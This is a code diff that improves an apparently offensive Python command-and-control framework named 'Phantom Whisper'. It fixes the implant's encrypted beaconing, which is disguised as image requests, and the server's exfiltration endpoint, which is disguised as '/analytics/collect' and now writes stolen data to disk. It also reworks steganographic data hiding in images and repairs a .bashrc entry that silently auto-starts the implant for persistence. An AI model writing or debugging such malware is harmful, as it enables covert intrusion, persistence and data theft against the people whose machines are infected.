@@ -60,14 +60,20 @@ INSTALL_FLAG = CONFIG_DIR / ".installed"
 
 def _pip_install(pkg: str) -> bool:
     try:
-        subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", pkg],
-                       capture_output=True, timeout=120)
-        return True
+        r = subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", pkg],
+                           capture_output=True, timeout=120)
+        return r.returncode == 0
     except: return False
 
 def _check_import(mod: str) -> bool:
     try:
-        __import__({"dnspython": "dns", "pycryptodome": "Cryptodome"}.get(mod, mod))
+        if mod == "pycryptodome":
+            # pycryptodome -> Crypto namespace, pycryptodomex -> Cryptodome namespace
+            try:
+                __import__("Cryptodome"); return True
+            except ImportError:
+                __import__("Crypto"); return True
+        __import__({"dnspython": "dns"}.get(mod, mod))
         return True
     except: return False
 
@@ -117,7 +123,8 @@ def auto_install(force: bool = False) -> bool:
 def _init_config():
     config = {
         "version": VERSION, "c2": {"dns_tunnel_domain": "c2.local", "dns_tunnel_port": 5353,
-        "http_port": 8080, "ws_port": 8081, "c2_server_host": "0.0.0.0", "heartbeat_interval": 60, "jitter": 25},
+        "http_port": 8080, "ws_port": 8081, "c2_server_host": "0.0.0.0", "heartbeat_interval": 60, "jitter": 25,
+        "http_fallback": "http://127.0.0.1:8080"},
         "encryption": {"kdf_iterations": 600000, "algorithm": "XChaCha20-Poly1305 + Fernet(AES-128-CBC)"},
         "plugins": {"enabled": True, "auto_reload": True},
         "updater": {"auto_update": True, "check_interval_days": 7}
@@ -146,6 +153,9 @@ def _confirm_deps():
     """Ensure deps are available before starting. If not, install."""
     if not _verify_install():
         auto_install(force=True)
+    # Ensure config + .secret + sample plugins exist even when deps were preinstalled
+    if not (CONFIG_DIR / "config.json").exists():
+        _init_config()
     # Now try importing - if still fail, show error
     for p in REQUIRED_DEPS:
         try:
@@ -181,8 +191,16 @@ import dns.resolver, dns.message, dns.query, dns.update, dns.tsig
 
 # Optional imports
 HAS_XCHACHA = False; HAS_WS = False; HAS_PIL = False; HAS_MSS = False
-try: from Cryptodome.Cipher import ChaCha20_Poly1305; HAS_XCHACHA = True
-except: pass
+try:
+    from Cryptodome.Cipher import ChaCha20_Poly1305
+    from Cryptodome.Random import get_random_bytes
+    HAS_XCHACHA = True
+except ImportError:
+    try:
+        from Crypto.Cipher import ChaCha20_Poly1305
+        from Crypto.Random import get_random_bytes
+        HAS_XCHACHA = True
+    except ImportError: pass
 try: import websockets; HAS_WS = True
 except: pass
 try: from PIL import Image; HAS_PIL = True
@@ -236,10 +254,31 @@ config = Config()
 # ═══════════════════════════════════════════════════════════════════════════════
 
 class Crypto:
+    MAGIC_X = b"PWX1"  # XChaCha20-Poly1305
+    MAGIC_F = b"PWF1"  # Fernet
     def __init__(self, password: Optional[str] = None):
-        self.password = password or os.environ.get("PW_C2_PASSWORD", secrets.token_urlsafe(32))
-        self.salt = base64.b64decode(os.environ.get("PW_C2_SALT", base64.b64encode(secrets.token_bytes(16)).decode()))
+        self.password, self.salt = self._load_key(password)
         self._init_fernet()
+    @staticmethod
+    def _load_key(password: Optional[str]) -> Tuple[str, bytes]:
+        """Shared key material: env vars > persistent .secret > fresh generation."""
+        env_pw = os.environ.get("PW_C2_PASSWORD")
+        env_salt = os.environ.get("PW_C2_SALT")
+        if env_pw and env_salt:
+            return env_pw, base64.b64decode(env_salt)
+        secret_file = CONFIG_DIR / ".secret"
+        if password:
+            return password, base64.b64decode(env_salt) if env_salt else hashlib.sha256(password.encode()).digest()[:16]
+        if secret_file.exists():
+            pw = secret_file.read_text().strip()
+            return pw, hashlib.sha256(pw.encode()).digest()[:16]
+        # First run: generate and persist so client+server on this box share the key
+        pw = secrets.token_urlsafe(32)
+        try:
+            secret_file.parent.mkdir(parents=True, exist_ok=True)
+            secret_file.write_text(pw); secret_file.chmod(0o600)
+        except: pass
+        return pw, hashlib.sha256(pw.encode()).digest()[:16]
     def _init_fernet(self):
         kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=self.salt, iterations=600000)
         key = base64.urlsafe_b64encode(kdf.derive(self.password.encode()))
@@ -247,14 +286,23 @@ class Crypto:
     def encrypt(self, data: bytes) -> bytes:
         if HAS_XCHACHA:
             try:
-                from Cryptodome.Random import get_random_bytes
                 k = get_random_bytes(32); n = get_random_bytes(24)
                 c = ChaCha20_Poly1305.new(key=k, nonce=n)
                 ct, tag = c.encrypt_and_digest(data)
-                return k + n + ct + tag
+                return self.MAGIC_X + k + n + ct + tag
             except: pass
-        return self.fernet.encrypt(data)
+        return self.MAGIC_F + self.fernet.encrypt(data)
     def decrypt(self, data: bytes) -> bytes:
+        if data[:4] == self.MAGIC_X and HAS_XCHACHA:
+            try:
+                k = data[4:36]; n = data[36:60]; ct = data[60:-16]; tag = data[-16:]
+                c = ChaCha20_Poly1305.new(key=k, nonce=n)
+                return c.decrypt_and_verify(ct, tag)
+            except: pass
+        if data[:4] == self.MAGIC_F:
+            try: return self.fernet.decrypt(data[4:])
+            except: pass
+        # Legacy fallback: no magic header (pre-2.0.1 frames)
         if HAS_XCHACHA and len(data) > 72:
             try:
                 k = data[:32]; n = data[32:56]; ct = data[56:-16]; tag = data[-16:]
@@ -438,7 +486,7 @@ class HTTPMimic:
     def poll(self, device_id: str) -> Optional[dict]:
         try:
             a = hashlib.sha256(f"{device_id}:{int(time.time())}".encode()).hexdigest()[:12]
-            r = self.session.get(f"{self.base}/assets/images/ui-{a}.png", headers=self._hdr(), timeout=10)
+            r = self.session.get(f"{self.base}/assets/images/{device_id}/ui-{a}.png", headers=self._hdr(), timeout=10)
             if r.status_code==200 and r.text.strip():
                 try: return self.crypto.decrypt_json(r.text.strip())
                 except: pass
@@ -461,14 +509,19 @@ class Stego:
             img = Image.open(img_path).convert("RGB"); px = list(img.getdata()); w, h = img.size
             hdr = struct.pack(">Q", len(data)); payload = hdr + data
             if len(payload)*8 > len(px)*3: img.close(); return None
-            new_px, di, bi = [], 0, 0
-            for r,g,b in px:
-                if di < len(payload):
-                    if bi<8: r=(r&0xFE)|((payload[di]>>(7-bi))&1); bi+=1
-                    if bi<8: g=(g&0xFE)|((payload[di]>>(7-bi))&1); bi+=1
-                    if bi<8: b=(b&0xFE)|((payload[di]>>(7-bi))&1); bi+=1
-                    if bi>=8: bi=0; di+=1
-                new_px.append((r,g,b))
+            # Linear bitstream: r0,g0,b0,r1,g1,b1,... (no mid-pixel skips)
+            bits = []
+            for byte in payload:
+                for i in range(8): bits.append((byte >> (7 - i)) & 1)
+            new_px, bi = [], 0
+            for r, g, b in px:
+                if bi < len(bits):
+                    r = (r & 0xFE) | bits[bi]; bi += 1
+                    if bi < len(bits):
+                        g = (g & 0xFE) | bits[bi]; bi += 1
+                        if bi < len(bits):
+                            b = (b & 0xFE) | bits[bi]; bi += 1
+                new_px.append((r, g, b))
             new = Image.new("RGB",(w,h)); new.putdata(new_px)
             out = out or str(Path(img_path).parent/f"{Path(img_path).stem}_stego.png")
             new.save(out); img.close(); new.close(); return out
@@ -477,22 +530,17 @@ class Stego:
         if not HAS_PIL: return None
         try:
             img = Image.open(img_path).convert("RGB"); px = list(img.getdata())
+            # Linear bitstream: r0,g0,b0,r1,g1,b1,... — first 64 bits = payload length (>Q)
             bits = []
-            for r,g,b in px[:8]: bits.extend([r&1,g&1,b&1])
-            hb = []
-            for i in range(8):
-                b = 0
-                for j in range(8):
-                    idx=i*8+j
-                    if idx<len(bits): b=(b<<1)|bits[idx]
-                hb.append(b)
-            dl = struct.unpack(">Q", bytes(hb))[0]; rem = px[8:]; bits = []
-            for r,g,b in rem: bits.extend([r&1,g&1,b&1])
-            db = []
+            for r, g, b in px: bits.extend([r & 1, g & 1, b & 1])
+            if len(bits) < 64: img.close(); return None
+            dl = 0
+            for i in range(64): dl = (dl << 1) | bits[i]
+            if dl < 0 or dl > (len(bits) - 64) // 8: img.close(); return None
+            db = bytearray()
             for i in range(dl):
                 b = 0
-                for j in range(8):
-                    if i*8+j<len(bits): b=(b<<1)|bits[i*8+j]
+                for j in range(8): b = (b << 1) | bits[64 + i * 8 + j]
                 db.append(b)
             img.close(); return bytes(db)
         except: return None
@@ -667,8 +715,24 @@ class Updater:
                     return tuple(int(p) if p.isdigit() else 0 for p in parts)
                 self.available=parse(tag)>parse(self.current)
                 return {"current":self.current,"latest":tag,"available":self.available,"url":d.get("html_url","")}
+            # No releases yet: fall back to tags, then report "up to date" rather than failing
+            r2 = req_lib.get(f"https://api.github.com/repos/{self.REPO}/tags",timeout=10,
+                             headers={"Accept":"application/vnd.github.v3+json"})
+            if r2.status_code==200 and r2.json():
+                tag = r2.json()[0].get("name","").lstrip("v"); self.latest=tag
+                self.available = self._newer(tag, self.current)
+                return {"current":self.current,"latest":tag,"available":self.available,
+                        "url":f"https://github.com/{self.REPO}/tags"}
+            self.latest=None; self.available=False
+            return {"current":self.current,"latest":None,"available":False,"url":"","note":"no releases or tags yet"}
         except: pass
         return None
+    @staticmethod
+    def _newer(a: str, b: str) -> bool:
+        def parse(v):
+            parts=v.split(".")
+            return tuple(int(p) if p.isdigit() else 0 for p in parts)
+        return parse(a)>parse(b)
     def update(self, force: bool = False) -> bool:
         if not self.available and not force: return False
         try:
@@ -801,9 +865,9 @@ class Persist:
         try:
             b = HOME/".bashrc"; script_path = Path(script).absolute()
             # 1. Add alias for easy access
-            alias_entry = f"\nalias phantom='python3 {script_path}'\n"
+            alias_entry = f"\nalias phantom=\"python3 {script_path}\"\n"
             # 2. Add auto-start entry (optional, but keeping it as requested)
-            autostart_entry = f"\n# Phantom Whisper Auto-Start\nif [ -f {script_path} ] && [ -z \"$PW_RUNNING\" ]; then export PW_RUNNING=1; python3 {script_path} &; fi\n"
+            autostart_entry = f"\n# Phantom Whisper Auto-Start\nif [ -f {script_path} ] && [ -z \"$PW_RUNNING\" ]; then export PW_RUNNING=1; python3 {script_path} &\nfi\n"
             
             content = b.read_text() if b.exists() else ""
             if "alias phantom=" not in content: content += alias_entry
@@ -891,10 +955,23 @@ class C2Server:
                 c = await asyncio.wait_for(reader.read(4096), timeout=10)
                 if not c: break
                 data += c
-            req = data.decode("utf-8",errors="replace"); lines = req.split("\r\n")
+            head, _, rest = data.partition(b"\r\n\r\n")
+            req = head.decode("utf-8", errors="replace"); lines = req.split("\r\n")
             if not lines: writer.close(); return
-            method, path, _ = lines[0].split(" ",2)
-            bs = req.find("\r\n\r\n")+4; body = req[bs:] if bs < len(req) else ""
+            method, path, _ = lines[0].split(" ", 2)
+            # Read full body: Content-Length may exceed what arrived with the headers
+            clen = 0
+            for ln in lines[1:]:
+                if ln.lower().startswith("content-length:"):
+                    try: clen = int(ln.split(":", 1)[1].strip())
+                    except: pass
+                    break
+            body = rest
+            while len(body) < clen:
+                c = await asyncio.wait_for(reader.read(4096), timeout=10)
+                if not c: break
+                body += c
+            body = body[:clen].decode("utf-8", errors="replace")
             resp = await self._route(method, path, body)
             writer.write(resp); await writer.drain()
         except: pass
@@ -911,6 +988,9 @@ class C2Server:
             elif path == "/api/v1/agents":
                 r = json.dumps({"agents":[a.dict() for a in self.agents.values()]}).encode()
                 return f"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {len(r)}\r\n\r\n".encode()+r
+            elif path == "/api/v1/agents/clear" and method == "POST":
+                self.agents.clear(); self.commands.clear(); self._bcast({"type":"stats","stats":self._stats})
+                return b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"
             elif path.startswith("/api/v1/command/") and method == "POST":
                 aid = path.split("/")[-1]; cmd = json.loads(body)
                 if aid not in self.commands: self.commands[aid]=[]
@@ -922,11 +1002,20 @@ class C2Server:
                 self._stats["exfils"]+=1; log(f"Exfil from {p.get('agent_id','?')}")
                 return b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"
             elif path == "/analytics/collect" and method == "POST":
-                try: self.exfil.append(self.crypto.decrypt_json(body))
+                try:
+                    p = self.crypto.decrypt_json(body)
+                    self.exfil.append(p)
+                    (DATA_DIR/f"exfil_{p.get('agent_id','?')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json").write_text(json.dumps(p,indent=2))
+                    self._stats["exfils"]+=1; log(f"Exfil from {p.get('agent_id','?')}")
                 except: pass
                 return b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"
             elif path.startswith("/assets/images/"):
-                return b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"
+                # HTTP-mimic beacon poll: /assets/images/{device_id}/ui-{hash}.png
+                aid = path.split("/")[3] if len(path.split("/")) > 3 else "?"
+                cmds = self._beacon(aid, {"hostname": aid, "ip": "", "agent_id": aid})
+                if cmds: self._stats["commands"] += len(cmds)
+                r = self.crypto.encrypt_json({"status": "ok", "commands": cmds})
+                return f"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {len(r)}\r\n\r\n{r}".encode()
             elif path == "/api/v1/dashboard":
                 h = self._dash(); return f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(h)}\r\n\r\n{h}".encode()
             elif path == "/api/v1/status":
